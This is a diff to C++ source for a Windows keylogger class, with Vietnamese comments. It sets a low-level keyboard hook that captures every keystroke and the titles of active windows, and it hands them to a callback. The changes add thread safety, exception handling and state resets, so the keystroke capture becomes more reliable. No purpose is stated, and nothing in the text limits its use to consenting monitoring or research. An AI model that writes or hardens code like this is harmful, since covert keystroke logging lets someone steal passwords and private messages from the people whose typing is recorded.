@@ -7,6 +7,7 @@
 #include <thread>
 #include <vector>
 #include <string>
+#include <mutex> // [FIX] Thêm mutex header
 
 #include <windows.h>
 #include <winuser.h>
@@ -19,10 +20,10 @@ class Keylogging
 {
 private:
     inline static KeyEventCallback callback = nullptr;
-    inline static std::atomic<bool> running = false;
+    inline static std::atomic<bool> running{false};
     inline static HHOOK keyboardHook = nullptr;
     inline static std::thread worker;
-    inline static DWORD threadId = 0;
+    inline static std::atomic<DWORD> threadId{0}; // [FIX] Atomic để tránh race condition
 
     // Biến trạng thái Logic
     inline static bool lastKeyWasPhysical = false;
@@ -32,6 +33,31 @@ private:
 
     // [MỚI] Biến lưu tiêu đề cửa sổ cũ
     inline static std::string lastWindowTitle = "";
+
+    // [FIX] Mutex để bảo vệ callback
+    inline static std::mutex callbackMutex;
+
+    // [FIX] Helper function để gọi callback an toàn trong HookProc
+    // Sử dụng try_lock để tránh blocking hook (có thể gây treo hệ thống)
+    static void safeCallback(const std::string& msg)
+    {
+        if (callbackMutex.try_lock())
+        {
+            if (callback)
+            {
+                try
+                {
+                    callback(msg);
+                }
+                catch (...)
+                {
+                    // [FIX] Bắt exception để tránh crash hook
+                }
+            }
+            callbackMutex.unlock();
+        }
+        // Nếu không lấy được lock, bỏ qua message này (tránh deadlock)
+    }
 
     static std::string WideToUtf8(const std::wstring &ws)
     {
@@ -87,11 +113,8 @@ private:
                     if (!currentTitle.empty() && currentTitle != lastWindowTitle)
                     {
                         lastWindowTitle = currentTitle;
-                        if (callback)
-                        {
-                            // Gửi log tiêu đề (xuống dòng cho đẹp)
-                            callback("\n\n[ " + currentTitle + " ]\n");
-                        }
+                        // [FIX] Sử dụng safeCallback
+                        safeCallback("\n\n[ " + currentTitle + " ]\n");
                     }
                 }
                 // ============================================================
@@ -111,20 +134,17 @@ private:
 
                     if (vk == VK_BACK)
                     {
-                        if (callback)
-                            callback("[BACKSPACE]");
+                        safeCallback("[BACKSPACE]"); // [FIX] Sử dụng safeCallback
                         return CallNextHookEx(keyboardHook, nCode, wParam, lParam);
                     }
                     if (vk == VK_RETURN)
                     {
-                        if (callback)
-                            callback("\n");
+                        safeCallback("\n"); // [FIX] Sử dụng safeCallback
                         return CallNextHookEx(keyboardHook, nCode, wParam, lParam);
                     }
                     if (vk == VK_TAB)
                     {
-                        if (callback)
-                            callback("\t");
+                        safeCallback("\t"); // [FIX] Sử dụng safeCallback
                         return CallNextHookEx(keyboardHook, nCode, wParam, lParam);
                     }
 
@@ -145,8 +165,7 @@ private:
 
                     if (ret > 0 && buffer[0] >= 32)
                     {
-                        if (callback)
-                            callback(WideToUtf8(buffer));
+                        safeCallback(WideToUtf8(buffer)); // [FIX] Sử dụng safeCallback
                     }
                     return CallNextHookEx(keyboardHook, nCode, wParam, lParam);
                 }
@@ -160,17 +179,14 @@ private:
                     {
                         if (lastKeyWasPhysical)
                         {
-                            if (callback)
-                            {
-                                callback("[BACKSPACE]");
-                                callback("[BACKSPACE]");
-                            }
+                            // [FIX] Sử dụng safeCallback
+                            safeCallback("[BACKSPACE]");
+                            safeCallback("[BACKSPACE]");
                             lastKeyWasPhysical = false;
                         }
                         else
                         {
-                            if (callback)
-                                callback("[BACKSPACE]");
+                            safeCallback("[BACKSPACE]"); // [FIX] Sử dụng safeCallback
                         }
                         return CallNextHookEx(keyboardHook, nCode, wParam, lParam);
                     }
@@ -178,10 +194,10 @@ private:
                     if (vk == VK_PACKET)
                     {
                         wchar_t ch = static_cast<wchar_t>(pKey->scanCode);
-                        if (callback && ch != 0)
+                        if (ch != 0)
                         {
                             std::wstring ws(1, ch);
-                            callback(WideToUtf8(ws));
+                            safeCallback(WideToUtf8(ws)); // [FIX] Sử dụng safeCallback
                         }
                         lastKeyWasPhysical = false;
                         return CallNextHookEx(keyboardHook, nCode, wParam, lParam);
@@ -201,8 +217,7 @@ private:
 
                     if (ret > 0 && buffer[0] >= 32)
                     {
-                        if (callback)
-                            callback(WideToUtf8(buffer));
+                        safeCallback(WideToUtf8(buffer)); // [FIX] Sử dụng safeCallback
                         lastKeyWasPhysical = false;
                     }
                     return CallNextHookEx(keyboardHook, nCode, wParam, lParam);
@@ -214,17 +229,19 @@ private:
 
     static void Loop()
     {
-        threadId = GetCurrentThreadId();
+        threadId.store(GetCurrentThreadId()); // [FIX] Atomic store
 
-        // [SỬA] Lấy trạng thái Shift physical hiện tại
+        // [FIX] Reset tất cả trạng thái khi bắt đầu
         physicalShiftHeld = (GetAsyncKeyState(VK_SHIFT) & 0x8000) != 0;
         lastWindowTitle = "";
+        lastKeyWasPhysical = false; // [FIX] Reset trạng thái
 
         HINSTANCE hInst = GetModuleHandle(nullptr);
         keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, HookProc, hInst, 0);
         if (!keyboardHook)
         {
             running.store(false);
+            threadId.store(0); // [FIX] Reset threadId khi thất bại
             return;
         }
 
@@ -232,6 +249,7 @@ private:
         if (!title.empty())
         {
             lastWindowTitle = title;
+            std::lock_guard<std::mutex> lock(callbackMutex); // [FIX] Bảo vệ callback
             if (callback)
             {
                 callback("\n\n[ " + title + " ]\n");
@@ -239,20 +257,30 @@ private:
         }
 
         MSG msg;
-        while (GetMessage(&msg, nullptr, 0, 0))
+        while (running.load() && GetMessage(&msg, nullptr, 0, 0)) // [FIX] Kiểm tra running
         {
             if (msg.message == WM_QUIT)
                 break;
             TranslateMessage(&msg);
             DispatchMessage(&msg);
         }
-        UnhookWindowsHookEx(keyboardHook);
-        keyboardHook = nullptr;
-        threadId = 0;
+        
+        // [FIX] Cleanup an toàn
+        if (keyboardHook)
+        {
+            UnhookWindowsHookEx(keyboardHook);
+            keyboardHook = nullptr;
+        }
+        threadId.store(0);
     }
 
 public:
-    static void setCallback(KeyEventCallback cb) { callback = cb; }
+    static void setCallback(KeyEventCallback cb) 
+    { 
+        std::lock_guard<std::mutex> lock(callbackMutex); // [FIX] Thread-safe callback assignment
+        callback = cb; 
+    }
+    
     static void start()
     {
         if (running.load())
@@ -260,14 +288,30 @@ public:
         running.store(true);
         worker = std::thread(Loop);
     }
+    
     static void stop()
     {
         if (!running.load())
             return;
         running.store(false);
-        if (threadId != 0)
-            PostThreadMessage(threadId, WM_QUIT, 0, 0);
+        
+        // [FIX] Lấy threadId an toàn với atomic
+        DWORD tid = threadId.load();
+        if (tid != 0)
+            PostThreadMessage(tid, WM_QUIT, 0, 0);
+            
         if (worker.joinable())
             worker.join();
+            
+        // [FIX] Reset trạng thái để tránh lỗi khi start lại
+        physicalShiftHeld = false;
+        lastKeyWasPhysical = false;
+        lastWindowTitle = "";
+    }
+    
+    // [FIX] Thêm hàm kiểm tra trạng thái
+    static bool isRunning()
+    {
+        return running.load();
     }
 };
